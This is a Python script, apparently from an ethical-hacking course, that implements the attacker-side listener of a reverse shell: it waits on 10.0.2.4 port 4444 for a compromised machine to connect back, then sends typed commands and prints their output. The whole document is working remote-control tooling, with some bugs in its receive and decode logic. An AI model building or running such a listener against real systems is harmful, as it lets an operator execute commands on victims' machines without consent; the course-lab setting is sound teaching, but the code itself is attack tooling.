#!/usr/bin/env python
# https://docs.python.org/2/library/socket.html
# https://www.tutorialspoint.com/python/python_networking.htm
import json
import socket

import chardet


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting fro incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(self.decode(data))
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                byte_data = self.connection.recv(1024)
                json_data = json_data + self.decode(byte_data)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            # command = raw_input(">> ") #  python 2
            command = command.split(" ")
            result = self.execute_remotely(command)
            print(result)

    def decode(self, data):
        try:
            encoding = chardet.detect(data)['encoding']
            return data.decode(encoding)
        except (UnicodeDecodeError, AttributeError, TypeError):
            return data


my_listener = Listener("10.0.2.4", 4444)
my_listener.run()
